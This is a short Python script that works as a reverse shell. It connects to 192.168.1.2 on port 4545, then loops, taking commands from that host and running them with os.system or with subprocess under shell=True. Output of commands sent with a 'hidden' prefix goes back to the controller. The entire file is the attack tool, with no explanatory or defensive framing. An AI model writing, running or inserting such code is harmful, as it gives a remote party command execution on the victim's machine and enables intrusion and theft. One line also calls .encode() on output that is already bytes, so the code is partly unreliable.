import socket
import subprocess
import os

s = socket.socket()

s.connect(("192.168.1.2", 4545))
while True:
    command = s.recv(1024).decode()
    if command.startswith("hidden"):
        try:
            command = command[7:]
            output = subprocess.check_output(command, shell=True)
            s.send(output.encode())
        except Exception as e:
            s.send(str(e).encode())
    else:
        os.system(command)
        s.send(b"done")